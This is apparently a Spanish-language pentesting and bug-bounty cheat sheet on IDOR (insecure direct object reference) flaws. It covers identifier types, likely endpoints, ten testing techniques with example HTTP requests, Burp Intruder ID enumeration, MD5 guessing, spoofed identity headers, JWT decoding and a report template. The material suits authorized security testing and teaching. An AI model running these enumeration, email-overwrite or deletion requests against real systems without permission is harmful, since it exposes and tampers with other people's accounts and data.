---
icon: lock-keyhole-open
---

# IDOR -  Insecure Direct Object Reference

Un IDOR ocurre cuando una aplicación usa un identificador controlable por el usuario (ID numérico, UUID, nombre de archivo...) para acceder directamente a un objeto sin verificar si ese usuario tiene permiso.

```http
GET /api/account/1042/statement HTTP/1.1
Authorization: Bearer TOKEN_USUARIO_A

- Devuelve el extracto bancario de la cuenta 1042
- Si cambiamos 1042 por 1043 y devuelve datos de otro usuario = IDOR 
```

### Tipos de IDOR

#### Por tipo de identificador

| Tipo                     | Ejemplo                                     |
| ------------------------ | ------------------------------------------- |
| **Numérico secuencial**  | `/user/1`, `/order/1042`                    |
| **UUID / GUID**          | `/doc/550e8400-e29b-41d4-a716-446655440000` |
| **Hash predecible**      | `MD5(email)`, `MD5(user_id)`                |
| **Nombre de archivo**    | `/download?file=informe_juan.pdf`           |
| **Referencia indirecta** | Índice que mapea a un recurso real          |
| **Correo electrónico**   | `/profile?email=victim@empresa.com`         |
| **Username**             | `/api/user/juan/settings`                   |

#### Por impacto

```
IDOR de lectura   → Acceder a datos de otros usuarios (GET)
IDOR de escritura → Modificar datos de otros usuarios (POST/PUT/PATCH)
IDOR de borrado   → Eliminar recursos de otros usuarios (DELETE)
IDOR de función   → Ejecutar acciones como otro usuario
```

### Localizar IDORs - Dónde buscar

```
Endpoints típicos:
GET  /api/users/{id}
GET  /api/orders/{order_id}
GET  /api/invoices/{invoice_id}/download
GET  /profile?user_id=123
GET  /documents?doc=45
GET  /admin/report/{report_id}
POST /api/messages/{thread_id}/reply
PUT  /api/account/{id}/settings
DELETE /api/posts/{post_id}

Parámetros en GET:
?id=123
?user_id=45
?account=ACC001
?doc_id=8
?file=report_q3.pdf
?ref=INV-2024-1042
?token=a1b2c3    ← aunque parezca aleatorio, puede ser predecible

Cuerpo en POST/PUT:
{"user_id": 123, "action": "reset_password"}
{"account_id": "ACC001", "amount": 500}
{"recipient_id": 456}

Cookies:
userId=123
accountId=ACC001
```

### Técnica 1 — ID numérico secuencial

La más simple. Cambiar el número en la URL o parámetro.

```http
-- Petición original (autenticado como usuario 1042) --
GET /api/users/1042/profile HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

-- Modificar el ID --
GET /api/users/1043/profile HTTP/1.1   - otro usuario
GET /api/users/1/profile HTTP/1.1      - normalmente usuario admin
GET /api/users/0/profile HTTP/1.1
GET /api/users/-1/profile HTTP/1.1
```

#### En Burp Intruder

```
1. Capturar la petición → Send to Intruder
2. Marcar el ID: /api/users/§1042§/profile
3. Payload type: Numbers
   From: 1000, To: 1100, Step: 1
4. Grep Match: campos sensibles del JSON (email, name, ssn...)
5. Columna "Length" — respuestas con longitud diferente = datos distintos
```

### Técnica 2 - UUID / GUID

UUID parece aleatorio pero a veces es predecible o filtrado en otras partes de la app.

```bash
# Formato UUID v4 (aleatorio)
550e8400-e29b-41d4-a716-446655440000

# UUID v1 (basado en timestamp + MAC — predecible)
# Se puede generar lista de UUIDs v1 en un rango de tiempo
pip install uuid-utils

# Buscar UUID del objetivo en la app:
# → Respuestas de la API: {"creator_id": "550e8400..."}
# → URLs compartidas: /share/550e8400-...
# → Emails de confirmación que incluyen IDs
# → Respuestas 404 que reflejan el UUID buscado
# → Otras respuestas del mismo usuario (el UUID puede repetirse en distintos recursos)
```

### Técnica 3 - Hash predecible (MD5/SHA1 del email o ID)

```bash
# Si el parámetro parece un hash, probar MD5 de valores conocidos
echo -n "victim@empresa.com" | md5sum
→ d8578edf8458ce06fbc5bb76a58c5ca4

echo -n "1042" | md5sum
→ a2566906... ← si coincide con el parámetro de la URL → IDOR

# Python
import hashlib
hashlib.md5(b"victim@empresa.com").hexdigest()
hashlib.sha1(b"1042").hexdigest()
```

### Técnica 4 - IDOR en método diferente

A veces el GET está protegido pero no el POST/PUT/DELETE.

```http
-- GET protegido (403) --
GET /api/users/1043/data HTTP/1.1
→ 403 Forbidden

-- POST no protegido (200) --
POST /api/users/1043/data HTTP/1.1
→ 200 OK {"email": "victim@...", ...}

-- HEAD (revela si existe el recurso) --
HEAD /api/users/1043/data HTTP/1.1
→ 200 OK (el recurso existe)
```

### Técnica 5 - IDOR en parámetros no obvios

```http
-- Petición de cambio de email --
POST /api/account/settings HTTP/1.1
Content-Type: application/json

{"email": "new@email.com"}

-- Añadir user_id al body --
{"email": "new@email.com", "user_id": 1043}
→ Si cambia el email de la cuenta 1043 = IDOR de escritura crítico
```

### Técnica 6 - IDOR en referencias indirectas

La app no expone el ID real sino una referencia (índice, alias). El ID real está mapeado en el backend.

```http
-- Endpoint de descarga --
GET /api/download?ref=3 HTTP/1.1    - ref=3 mapea al tercer archivo del usuario

-- Si ref es un índice global (no por usuario) --
GET /api/download?ref=1 HTTP/1.1    - primer archivo de cualquier usuario
GET /api/download?ref=100 HTTP/1.1
```

### Técnica 7 - IDOR en endpoints de API versionados

```http
-- v2 tiene control de acceso --
GET /api/v2/users/1043 HTTP/1.1 → 403

-- v1 no tiene control de acceso --
GET /api/v1/users/1043 HTTP/1.1 → 200 OK

-- También probar --
/api/v1/, /api/v2/, /api/v3/, /v1/, /v2/
/api/legacy/, /api/internal/, /api/dev/
```

### Técnica 8 - IDOR de escritura/borrado

```http
-- Modificar datos de otro usuario --
PUT /api/users/1043/email HTTP/1.1
Authorization: Bearer TOKEN_USUARIO_1042

{"email": "attacker@evil.com"}

→ Si devuelve 200 = cuenta 1043 comprometida

-- Borrar recursos de otro usuario --
DELETE /api/posts/9988 HTTP/1.1
Authorization: Bearer TOKEN_USUARIO_SIN_PRIVILEGIOS

→ Si devuelve 200 = post borrado sin autorización
```

### Técnica 9 - IDOR en cabeceras

```http
-- Algunos backends confían en headers custom --
GET /api/account/statement HTTP/1.1
X-User-Id: 1043              ← sobreescribir el ID del usuario

-- X-Forwarded-For como pseudo-autenticación (raro pero existe) --
GET /internal/admin HTTP/1.1
X-Forwarded-For: 127.0.0.1

-- Otros headers a probar --
X-Original-User: admin
X-User: admin@empresa.com
X-Account-Id: 1043
```

### Técnica 10 - IDOR en JSON Web Tokens

```bash
# Decodificar el JWT
echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMDQyfQ.xxx" | python3 -c "
import sys, base64, json
parts = sys.stdin.read().strip().split('.')
payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
print(json.dumps(json.loads(base64.b64decode(payload)), indent=2))
"
# Output: {"user_id": 1042, "role": "user"}

# Si el JWT no está firmado o usa alg=none → modificar el payload directamente
# Si tiene firma débil → crackear y re-firmar
# → Ver técnicas en la sección de JWT attacks
```

### Escalada de IDOR a crítico

```
IDOR básico (leer datos) → HIGH
IDOR + datos sensibles (PII, financiero, médico) → CRITICAL

IDOR de escritura → HIGH / CRITICAL
IDOR de escritura sobre cuenta admin → CRITICAL
IDOR de reseteo de contraseña → CRITICAL

Cadena: IDOR → obtener token de sesión de admin → ATO completo → CRITICAL
```

### PoC para bug bounty

```http
-- Petición 1: Obtener ID propio --
GET /api/users/me HTTP/1.1
Authorization: Bearer TOKEN_ATACANTE
→ {"id": 1042, "email": "attacker@test.com"}

-- Petición 2: Acceder al ID de la víctima --
GET /api/users/1043 HTTP/1.1
Authorization: Bearer TOKEN_ATACANTE
→ {"id": 1043, "email": "victim@empresa.com", "phone": "...", "address": "..."}

Impacto: Un usuario autenticado puede acceder a la información personal
de cualquier otro usuario de la plataforma modificando el parámetro "id"
en la URL. No se requieren privilegios especiales.
```

> Los mejores IDORs están en endpoints de API que devuelven JSON — las vistas HTML suelen tener más controles porque el developer las ve, pero las APIs internas se olvidan.

> Burp Suite Autorize extension automatiza la prueba de IDOR: captura peticiones de un usuario con privilegios y las repite automáticamente con el token de otro usuario de menor privilegio.

